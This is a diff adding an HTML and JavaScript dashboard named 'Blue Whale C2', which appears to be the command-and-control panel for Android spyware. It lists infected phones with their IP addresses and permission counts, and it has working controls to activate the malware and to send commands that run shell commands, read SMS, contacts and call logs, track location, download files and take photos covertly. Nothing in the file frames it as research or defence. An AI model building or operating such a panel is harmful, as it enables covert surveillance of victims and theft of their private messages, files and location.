@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Blue Whale C2</title>
+    <style>
+        body { background:#0a0e27; color:#e0e0e0; font-family:Segoe UI,sans-serif; padding:2rem; }
+        h1 { color:#22d3ee; }
+        table { width:100%; border-collapse:collapse; margin-top:1rem; background:#12122a; border-radius:10px; overflow:hidden; }
+        th { background:#1a1a3a; padding:.8rem; text-align:left; font-size:.8rem; text-transform:uppercase; }
+        td { padding:.7rem; border-bottom:1px solid #1a1a3a; }
+        .btn { background:#22d3ee; border:0; color:#000; padding:.5rem 1rem; border-radius:6px; cursor:pointer; font-weight:600; margin:.2rem; }
+        .btn.red { background:#ef4444; color:#fff; }
+        input, select { background:#1a1a3a; color:#fff; border:1px solid #2a2a4a; padding:.5rem; border-radius:6px; margin:.2rem; }
+    </style>
+</head>
+<body>
+<h1>🐋 Blue Whale C2</h1>
+<div id="stats" style="display:flex; gap:2rem; margin:1rem 0;">
+    <div>Total: <span id="total">-</span></div>
+    <div>Dormant: <span id="dormant">-</span></div>
+    <div>Malware Active: <span id="active">-</span></div>
+</div>
+<table id="devices"><thead><tr><th>ID</th><th>Device</th><th>Android</th><th>IP</th><th>Perms</th><th>Status</th><th>Actions</th></tr></thead><tbody></tbody></table>
+
+<h2 style="margin-top:2rem;">Issue Command</h2>
+<div>
+    <select id="cmdDevice"></select>
+    <select id="cmdType">
+        <option value="activate_malware">Activate Malware</option>
+        <option value="deactivate_malware">Deactivate Malware</option>
+        <option value="shell">Shell Command</option>
+        <option value="sms_inbox">Read SMS</option>
+        <option value="contacts">Read Contacts</option>
+        <option value="location">Get Location</option>
+        <option value="call_logs">Read Call Logs</option>
+        <option value="list_dir">List Directory</option>
+        <option value="download_file">Download File</option>
+        <option value="take_photo">Take Photo Now</option>
+    </select>
+    <input id="cmdParams" placeholder='{"path":"/sdcard"}' size="30">
+    <button class="btn" onclick="sendCommand()">Send</button>
+</div>
+
+<script>
+    async function load() {
+        const r = await fetch('/api/v1/devices'); const devices = await r.json();
+        const tb = document.querySelector('#devices tbody'); tb.innerHTML='';
+        const sel = document.getElementById('cmdDevice'); sel.innerHTML='';
+        devices.forEach(d => {
+            const tr = document.createElement('tr');
+            const status = d.malwareActive ? '🔥 MALWARE ACTIVE' : d.status;
+            const perms = Object.keys(JSON.parse(d.permissionsGranted||'{}')).length;
+            tr.innerHTML = `<td>${d.id.slice(0,8)}</td><td>${d.deviceName||'-'}</td><td>${d.androidVersion||'-'}</td>
+          <td>${d.ipAddress||'-'}</td><td>${perms}</td><td>${status}</td>
+          <td>
+            <button class="btn" onclick="activate('${d.id}')">Activate</button>
+            <button class="btn red" onclick="deactivate('${d.id}')">Off</button>
+            <a class="btn" href="/api/v1/photos/${d.id}">Photos</a>
+          </td>`;
+            tb.appendChild(tr);
+            const opt = document.createElement('option'); opt.value=d.id; opt.textContent=d.id.slice(0,12); sel.appendChild(opt);
+        });
+        const s = await fetch('/api/v1/stats'); const st = await s.json();
+        document.getElementById('total').textContent=st.total;
+        document.getElementById('dormant').textContent=st.dormant;
+        document.getElementById('active').textContent=st.malware_active;
+    }
+    async function activate(id){ await fetch(`/api/v1/activate/${id}`,{method:'POST'}); load(); }
+    async function deactivate(id){ await fetch(`/api/v1/deactivate/${id}`,{method:'POST'}); load(); }
+    async function sendCommand(){
+        const cmd = document.getElementById('cmdType').value;
+        const deviceId = document.getElementById('cmdDevice').value;
+        const params = document.getElementById('cmdParams').value || '{}';
+        await fetch('/api/v1/command', {method:'POST', headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({deviceId, command:cmd, params})});
+        alert('Command issued');
+    }
+    load(); setInterval(load, 15000);
+</script>
+</body>
+</html>
